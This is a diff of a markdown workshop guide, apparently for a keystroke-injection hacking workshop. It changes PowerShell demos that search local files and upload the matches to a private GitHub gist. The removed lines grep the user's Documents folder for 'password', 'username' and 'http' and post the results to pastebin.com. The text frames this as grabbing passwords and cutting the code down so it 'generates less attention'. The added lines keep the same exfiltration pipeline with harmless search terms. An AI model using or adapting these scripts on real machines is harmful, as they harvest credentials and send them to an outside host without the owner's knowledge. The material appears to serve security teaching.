@@ -21,9 +21,6 @@ set-executionpolicy unrestricted
 . .\logindata.ps1
 $Content = Invoke-WebRequest -Uri "https://ipinfo.io/json"
 
-. .\logindata.ps1
-$Content = Invoke-WebRequest -Uri "https://ipinfo.io/json"
-
 $body = @{
     description = "Uploading a first gist to github"
     public      = $false
@@ -84,7 +81,7 @@ Create a new file called "new-github2.ps1" and copy paste the following data in 
 
 #Demo 2, let's grab some passwords from local files!
 . .\logindata.ps1
-$Content = ls c:\temp -r | Select-String password,username,http | select line,path
+$Content = ls c:\temp -r | Select-String dog,cat,pets | select line,path
 $ContentString = $Content | ForEach-Object { "$($_.path): $($_.line)" } | Out-String
 
 $Description = "Github second demo"
@@ -117,50 +114,25 @@ Execute new-github2.ps1 from the terminal. If all goes well, you will have this 
 ![Github demo 2](../images/githubdemo2.png)
 
 
-# Pastebin third demo
+# Github third demo
 
-Powershell stores the data in an object. Which is not bad but invoke-webrequest doesn’t understand it and thus the parsing is bad.
-Let’s convert the data to a format which will work.
-Create new-pastebin3.ps1 and observe the difference with new-pastebin2.ps1
-```powershell
-. .\logindata.ps1
-$Content = ConvertTo-Json (ls c:\users\$env:username\Documents -r | Select-String password,username,http | select line,path)
-$Title      =   "pastebin3"
+There is no third demo! Because of the way that Github expects data (json) compared to Pastebin, we can skip this step as we already had to structure our data in the demos before this. Enjoy this filler.
 
-$Body = @{ 
-    api_dev_key         = $DevKey;
-    api_user_key        = $UserKey;
-    api_paste_name	    = $Title;
-    api_paste_code      = $Content;
-    api_paste_private   = "2"; # 0=public 1=unlisted 2=private
-    api_option          = "paste";
-    }
-
-Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post -OutFile $Title.txt
-```
-
-
-Now launch new-pastebin3.ps1 from the terminal.
-Observe the results in your pastebin.com account
-
-# Pasebin fourth demo
+# Github  fourth demo
 We want to generate a bit less attention so we will try to have less lines of code on our screen.
 Luckily, we can do this by using “;” in powershell
-Create new-pastebin4.ps1 and new-pastebin5.ps1
+Create new-pastebin4.ps1
+
+Remark: This is actually some foreshadowing. This workshop is all about using a virtual keyboard to send malicious commands as fast as possible, using our little hacking tool. So we want to be fast, using less code to make it all more robust.
 
 new-pastebin4.ps1
 ```powershell
 . .\logindata.ps1
-$Content = ConvertTo-Json (ls c:\users\$env:username\Documents -r | Select-String password,username,http | select line,path); $Title="pastebin4"
-$Body = @{ api_dev_key=$DevKey; api_user_key=$UserKey; api_paste_name=$Title;api_paste_code=$Content;api_paste_private="2";api_option="paste";}
-Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post -OutFile $Title.txt
+$c = Get-ChildItem C:\temp -Recurse -File | Select-String 'dog|cat|pets' | ForEach-Object { "$($_.Path): $($_.Line)" } | Out-String
+$body = @{description="Github second demo"; public=$false; files=@{"secrets.txt"=@{content=$c}}} | ConvertTo-Json -Depth 4
+Invoke-WebRequest -Uri "https://api.github.com/gists" -Method POST -Headers @{Authorization="Bearer $FGPAT"; "X-GitHub-Api-Version"="2022-11-28"} -Body $body -ContentType "application/json"
+
 ```
-new-pastebin5.ps1
-```powershell
-$DevKey="PUT-DEVKEY-HERE";$UserKey="PUT-USER-KEY-HERE"
-$Content = ConvertTo-Json (ls c:\users\$env:username\Documents -r | Select-String password,username,http | select line,path); $Title="pastebin5"
-$Body = @{ api_dev_key=$DevKey; api_user_key=$UserKey; api_paste_name=$Title;api_paste_code=$Content;api_paste_private="2";api_option="paste";}
-Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post -OutFile $Title.txt
-```
+
 Observe the concatenation done in those 2 files.
 
